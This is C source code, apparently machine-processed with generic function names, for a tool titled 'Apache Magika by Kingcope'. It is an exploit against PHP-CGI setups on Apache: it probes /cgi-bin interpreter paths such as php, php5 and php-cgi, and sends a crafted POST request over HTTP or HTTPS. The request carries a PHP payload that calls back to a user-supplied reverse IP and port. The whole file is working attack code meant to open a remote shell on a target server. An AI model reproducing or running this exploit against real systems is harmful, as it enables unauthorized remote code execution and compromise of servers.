#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
struct sockaddr_in {int dummy; } ;
struct option {char* member_0; int /*<<< orphan*/  member_3; int /*<<< orphan*/  member_2; int /*<<< orphan*/  const member_1; } ;
struct TYPE_3__ {int /*<<< orphan*/ * handle; int /*<<< orphan*/ * ctx; } ;
typedef  TYPE_1__ connection ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/ * FUNC0 (int /*<<< orphan*/ ) ; 
 int FUNC1 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 () ; 
 int /*<<< orphan*/ * FUNC3 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ *,char*,int) ; 
 int /*<<< orphan*/  FUNC6 () ; 
 unsigned short FUNC7 (char*) ; 
 char* FUNC8 (unsigned int,int) ; 
 scalar_t__ FUNC9 (int,void*,int) ; 
 int /*<<< orphan*/  FUNC10 (int) ; 
 struct sockaddr_in* FUNC11 (char*,unsigned short) ; 
 int FUNC12 (int,char**,char*,struct option*,int*) ; 
 scalar_t__ FUNC13 (int) ; 
 int /*<<< orphan*/  FUNC14 (char*,char*,int) ; 
 char* optarg ; 
 int optind ; 
 char* phpstr ; 
 char* poststr ; 
 int /*<<< orphan*/  FUNC15 (char*,...) ; 
 char* FUNC16 (int) ; 
#define  required_argument 128 
 int /*<<< orphan*/  FUNC17 (char*,unsigned int,char*,char*,...) ; 
 int FUNC18 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 char* FUNC19 (TYPE_1__*) ; 
 int /*<<< orphan*/  FUNC20 (char*,char*) ; 
 char* FUNC21 (char*) ; 
 int FUNC22 (char*) ; 
 int /*<<< orphan*/  FUNC23 (char**) ; 
 int /*<<< orphan*/  FUNC24 (int,char*,int) ; 

int FUNC25(int argc, char *argv[])
{
  char *target, *protocol, *targetip, *writestr, *tmpstr, *readbuf=NULL,
   *interpreter, *reverseip, *reverseportstr, *forceinterpreter=NULL;
  char httpsflag=0;
  unsigned short port=0, reverseport=0;
  struct sockaddr_in *server;
  int sockfd;
  unsigned int writesize, tmpsize;
  unsigned int i;
  connection *sslconnection;
  FUNC15("-== Apache Magika by Kingcope ==-\n");
  for(;;)
  {
	 int c;
     int option_index=0;
     static struct option long_options[] = {
	   {"target", required_argument, 0, 0 },
	   {"port", required_argument, 0, 0 },
	   {"protocol", required_argument, 0, 0 },
	   {"reverse-ip", required_argument, 0, 0 },
	   {"reverse-port", required_argument, 0, 0 },
	   {"force-interpreter", required_argument, 0, 0 },	   
	   {0, 0, 0, 0 }
	  };
	 
	 c = FUNC12(argc, argv, "", long_options, &option_index);
     if (c < 0)
     	break;
     
     switch (c) {
	 case 0:
	  switch (option_index) {
	   case 0:
	    if (optarg) {
	     target = FUNC8(FUNC22(optarg)+1, sizeof(char));
	     if (!target) {
		  FUNC15("calloc error (2)\n");
	      FUNC10(255);
         }
	     FUNC14(target, optarg, FUNC22(optarg)+1);
    	}
        break;
       case 1:
        if(optarg)
	     port = FUNC7(optarg);
        break;
       case 2:
        protocol = FUNC8(FUNC22(optarg)+1, sizeof(char));
        if (!protocol) {
	     FUNC15("calloc error (3)\n");
         FUNC10(255);
        }
        FUNC14(protocol, optarg, FUNC22(optarg)+1);
        if (!FUNC20(protocol, "https"))
         httpsflag=1;
        break;
       case 3:
        reverseip = FUNC8(FUNC22(optarg)+1, sizeof(char));
        if (!reverseip) {
	     FUNC15("calloc error (4)\n");
         FUNC10(255);
        }
        FUNC14(reverseip, optarg, FUNC22(optarg)+1);       
        break;
       case 4:
	    reverseport = FUNC7(optarg);       
		reverseportstr = FUNC8(FUNC22(optarg)+1, sizeof(char));
        if (!reverseportstr) {
	     FUNC15("calloc error (5)\n");
         FUNC10(255);
        }
        FUNC14(reverseportstr, optarg, FUNC22(optarg)+1);  	     
        break;
       case 5:
        forceinterpreter = FUNC8(FUNC22(optarg)+1, sizeof(char));
        if (!forceinterpreter) {
	     FUNC15("calloc error (6)\n");
         FUNC10(255);
        }
        FUNC14(forceinterpreter, optarg, FUNC22(optarg)+1);       
        break;
       default:
        FUNC23(argv);
	  }
	  break;
	 
	 default:
	  FUNC23(argv);
     }
  }

  if ((optind < argc) || !target || !protocol || !port ||
      !reverseip || !reverseport){
	FUNC23(argv);
  }
  
  server = FUNC11(target, port);
  if (!server) {
   FUNC15("Error while resolving hostname. (7)\n");
   FUNC10(255);
  }

  char *interpreters[5];
  int ninterpreters = 5;
  interpreters[0] = FUNC21("/cgi-bin/php");
  interpreters[1] = FUNC21("/cgi-bin/php5");
  interpreters[2] = FUNC21("/cgi-bin/php-cgi");
  interpreters[3] = FUNC21("/cgi-bin/php.cgi");
  interpreters[4] = FUNC21("/cgi-bin/php4");
  
  for (i=0;i<ninterpreters;i++) {
   interpreter = interpreters[i];
   if (forceinterpreter) {
     interpreter = FUNC21(forceinterpreter);
   }
   if (forceinterpreter && i)
    break;
   FUNC15("%s\n", interpreter);
   
   sockfd = FUNC18(AF_INET, SOCK_STREAM, 0);
   if (sockfd < 1) { 
	 FUNC15("socket error (8)\n");
	 FUNC10(255);
   }
  
   if (FUNC9(sockfd, (void*)server, sizeof(struct sockaddr_in)) < 0) {
    FUNC15("connect error (9)\n");
    FUNC10(255);	  
   }
   if (httpsflag) {
    sslconnection = (connection*) FUNC13(sizeof(connection));
    if (!sslconnection) {
     FUNC15("malloc error (10)\n");
     FUNC10(255);   
    }
    sslconnection->handle = NULL;
    sslconnection->ctx = NULL;

    FUNC2();

    sslconnection->ctx = FUNC0(FUNC6());
    if (!sslconnection->ctx) {
 	 FUNC15("SSL_CTX_new error (11)\n");
     FUNC10(255);
    }

    sslconnection->handle = FUNC3(sslconnection->ctx);
    if (!sslconnection->handle) {
 	 FUNC15("SSL_new error (12)\n");
	 FUNC10(255);   
    }
    if (!FUNC4(sslconnection->handle, sockfd)) {
 	 FUNC15("SSL_set_fd error (13)\n");
     FUNC10(255);
    }
   
    if (FUNC1(sslconnection->handle) != 1) {
	 FUNC15("SSL_connect error (14)\n");
     FUNC10(255);       
    }
   }
  
   tmpsize = FUNC22(phpstr) + FUNC22(reverseip) + FUNC22(reverseportstr) + 64;
   tmpstr = (char*)FUNC8(tmpsize, sizeof(char));
   FUNC17(tmpstr, tmpsize, phpstr, reverseip, reverseport);
   
   writesize = FUNC22(target) + FUNC22(interpreter) + 
     FUNC22(poststr) + FUNC22(tmpstr) + 64;
   writestr = (char*)FUNC8(writesize, sizeof(char));
   FUNC17(writestr, writesize, poststr, interpreter,
     target, FUNC22(tmpstr), tmpstr);
  
   if (!httpsflag) {
	 FUNC24(sockfd, writestr, FUNC22(writestr));
	 readbuf = FUNC16(sockfd);
   } else {
	 FUNC5(sslconnection->handle, writestr, FUNC22(writestr));
	 readbuf = FUNC19(sslconnection);
   }
  
   if (readbuf) {
     FUNC15("***SERVER RESPONSE***\n\n%s\n\n", readbuf);  
   } else {
    FUNC15("read error (15)\n");
    FUNC10(255);	  
   }
  }
  FUNC10(1);
}